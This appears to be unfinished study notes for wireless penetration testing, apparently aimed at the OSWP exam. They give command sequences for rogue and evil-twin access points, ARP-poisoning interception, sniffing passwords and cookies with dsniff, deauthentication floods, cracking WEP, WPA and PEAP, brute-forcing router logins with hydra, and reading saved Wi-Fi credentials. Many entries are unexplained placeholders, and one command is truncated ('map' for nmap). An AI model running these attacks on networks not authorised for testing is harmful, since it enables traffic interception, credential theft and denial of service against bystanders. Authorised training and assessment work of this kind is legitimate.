# Advanced Wlan Techniques

## Man-in-the-Middle attack

Description:
This attack sets up a rogue access point with the same SSID as a legitimate one,
tricking clients into connecting. Once connected, the attacker can intercept, modify,
or redirect traffic. Use during security assessments to evaluate a network's resistance
to rogue APs and traffic interception risks. It demonstrates the risks of trusting
unsecured or spoofed access points and the importance of certificate pinning, VPNs,
and user awareness.

```bash
airmon-ng start wlan0                                                # Enable monitor mode on the wlan0 interface
airbase-ng -e RogueAP -c [channel] mon0                              # Create a fake AP named "RogueAP" on the specified channel
ifconfig at0 up                                                      # Bring up the virtual interface created by airbase-ng
dhcpd at0                                                            # Start DHCP server to assign IPs to clients connecting to at0
ifconfig at0 192.168.1.1 netmask 255.255.255.0                       # Set a static IP on the fake interface
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1      # Route traffic through the fake gateway
echo 1 > /proc/sys/net/ipv4/ip_forward                               # Enable IP forwarding to relay traffic
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE                 # Masquerade traffic from at0 to external network via eth0
ettercap -T -q -i at0 -M arp:remote // //                            # Launch ARP poisoning to intercept and sniff network traffic
```

## Wireless Eavesdropping
## Description:
## This passive attack involves capturing wireless packets in the air for later analysis.
## When to Use:
## Use during recon or to analyze open or poorly encrypted networks without disrupting them.
## Why:
## It reveals sensitive data or credentials transmitted in plaintext, misconfigured encryption, and device behavior.

```bash
airmon-ng start wlan0          # Enable monitor mode on the wireless card
airodump-ng mon0              # View available wireless networks and clients
wireshark &                   # Launch Wireshark for real-time packet capture and analysis
# Then apply display filters like:
# http                     - To view unencrypted web traffic
# tcp.port==80             - To isolate standard HTTP port traffic
# wlan.fc.type_subtype==0x08 - To view Beacon frames


```
## Session Hijacking over Wireless
```bash
Description:
This attack captures session tokens, cookies, or credentials from unencrypted network traffic to hijack user sessions.

When to Use:
When users connect to insecure networks (e.g., public Wi-Fi), to demonstrate risks of non-HTTPS services.

Why:
To stress the importance of HTTPS, secure cookie flags, and encrypted transport layers.
airmon-ng start wlan0        # Enable monitor mode
airodump-ng mon0             # Discover nearby wireless traffic
driftnet -i mon0             # Intercept and display images being transmitted
dsniff -i mon0               # Capture passwords, session cookies, and credentials from sniffed traffic
urlsnarf -i mon0             # Log all URLs accessed by devices on the network


```
## Enumerating wireless security profiles
## Description:
## This involves identifying saved or auto-connect wireless profiles on a system, including previously connected networks and their credentials.

## When to Use:
## When analyzing client device configurations or performing post-exploitation data gathering.

## Why:
## It shows what networks a device connects to and can expose credentials or hint at physical locations.
```bash
nmcli dev wifi list                                      # List available networks and their security types
cat /etc/NetworkManager/system-connections/*             # Display saved wireless profiles and potential credentials

```

---

# Attacking The Client Annotated

## Mis-Association Attack (Honeypot)
```bash
airmon-ng start wlan0  # 
airbase-ng -P -C 30 -e "Free Public WiFi" -c [channel] mon0  # 
ifconfig at0 up  # 
dhclient at0

```
## Caffe Latte Attack (Client WEP Key Retrieval)
```bash
airmon-ng start wlan0  # 
airbase-ng -e "test" -c [channel] -W 1 -Z 4 mon0  # 
airodump-ng -c [channel] --bssid [spoofed MAC] -w lattekill mon0  # 

```
## De-Authenticating the Client
```bash
airmon-ng start wlan0  # 
airodump-ng mon0  # 
aireplay-ng --deauth 5 -a [AP MAC] -c [client MAC] mon0  # 


```
## Cracking WEP with Hirte
```bash
airmon-ng start wlan0  # 
airodump-ng mon0  # 
aireplay-ng --interactive -b [target MAC] -h [your MAC] mon0  # 
aircrack-ng -z -n 64 -b [target MAC] wephirte.cap


```
## AP-less WPA cracking
```bash
airmon-ng start wlan0  # 
airbase-ng -e [target ESSID] -c [channel] -a [target BSSID] -Z 4 mon0  # 
airodump-ng -c [channel] --bssid [target BSSID] -w ap-less mon0  # 
aireplay-ng --deauth 5 -a [target BSSID] -c [client MAC] mon0  # 
aircrack-ng -w /path/to/wordlist.txt ap-less-01.cap
```

---

# Attacking Wpa And Radius Annotated

## Setting up the AP with FreeRadius-WPE
*Description:*

```bash
airmon-ng start wlan0  # [Explain this command]
airbase-ng -e SecureNet -c [channel] mon0  # [Explain this command]
/etc/init.d/freeradius-wpe start
tail -f /var/log/freeradius-wpe.log

```
## Cracking PEAP
*Description:*

# After capturing the MSCHAPv2 credentials using FreeRADIUS-WPE:
```bash
asleap -C [challenge] -R [response] -W /path/to/wordlist.txt  # [Explain this command]

```
## Cracking EAP-TTLS
*Description:*

# Extract the tunneled MSCHAPv2 challenge/response from FreeRADIUS-WPE logs
```bash
asleap -C [challenge] -R [response] -W /path/to/wordlist.txt  # [Explain this command]

Note: The cracking process is identical to PEAP once the inner authentication is revealed.
```

---

# Encryption Flaws Annotated

## # OSWP
*Description:*


## Cracking WEP (p74)
*Description:*

```bash
airmon-ng start wlan0  # [Explain this command]
airodump-ng mon0  # [Explain this command]
airodump-ng -c [channel] --bssid [target MAC] -w wepcrack mon0  # [Explain this command]
aireplay-ng -3 -b [target MAC] -h [your MAC] mon0  # [Explain this command]
aircrack-ng wepcrack-01.cap  # [Explain this command]

```
## Cracking WPA-PSK Weak Passphrase (p85)
*Description:*

```bash
airmon-ng start wlan0  # [Explain this command]
airodump-ng mon0  # [Explain this command]
airodump-ng --bssid [target MAC] -c [channel] -w wpacrack mon0  # [Explain this command]
aireplay-ng --deauth 10 -a [target MAC] -c [client MAC] mon0  # [Explain this command]
aircrack-ng -w /path/to/wordlist.txt -b [target MAC] wpacrack-01.cap  # [Explain this command]

```
## Decrypting WEP and WPA Packets (p94)
*Description:*

# WEP
airdecap-ng -w [WEP key] wepcrack-01.cap
# WPA
airdecap-ng -e [ESSID] -p [passphrase] wpacrack-01.cap

## Connecting to WEP Network (p96)
*Description:*

```bash
ifconfig wlan0 down  # [Explain this command]
iwconfig wlan0 essid [network name]
iwconfig wlan0 key s:[WEP key]
ifconfig wlan0 up  # [Explain this command]
dhclient wlan0

```
## Connecting to WPA Network (p97)
*Description:*

```bash
wpa_passphrase [network name] [passphrase] > wpa.conf  # [Explain this command]
wpa_supplicant -B -Dwext -i wlan0 -c wpa.conf  # [Explain this command]
dhclient wlan0
```

---

# Attacks On Wlan Annotated

## Cracking Default Accounts on the Access Points
*Description:*

map -p 80 --script http-default-accounts [router IP]
hydra -l admin -P /usr/share/wordlists/rockyou.txt [router IP] http-get /

## Deauthentication DoS Attack
*Description:*

```bash
airmon-ng start wlan0  # [Explain this command]
airodump-ng mon0  # [Explain this command]
aireplay-ng --deauth 1000 -a [target AP MAC] mon0  # [Explain this command]

```
## Evil Twin with MAC Spoofing
*Description:*

```bash
airmon-ng start wlan0  # [Explain this command]
airodump-ng mon0  # [Explain this command]
macchanger --mac [spoofed MAC] wlan0
airbase-ng -e [ESSID] -c [channel] -a [spoofed MAC] mon0  # [Explain this command]
ifconfig at0 up  # [Explain this command]
dhcpd at0  # [Explain this command]
ifconfig at0 192.168.10.1 netmask 255.255.255.0  # [Explain this command]
iptables --flush  # [Explain this command]
iptables --table nat --flush  # [Explain this command]
iptables --delete-chain  # [Explain this command]
iptables --table nat --delete-chain  # [Explain this command]
iptables -P FORWARD ACCEPT  # [Explain this command]
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE  # [Explain this command]
echo 1 > /proc/sys/net/ipv4/ip_forward  # [Explain this command]

```
## Rogue Access Point
*Description:*

```bash
airmon-ng start wlan0  # [Explain this command]
airbase-ng -e RogueAP -c [channel] mon0  # [Explain this command]
ifconfig at0 up  # [Explain this command]
dhclient at0
```

---
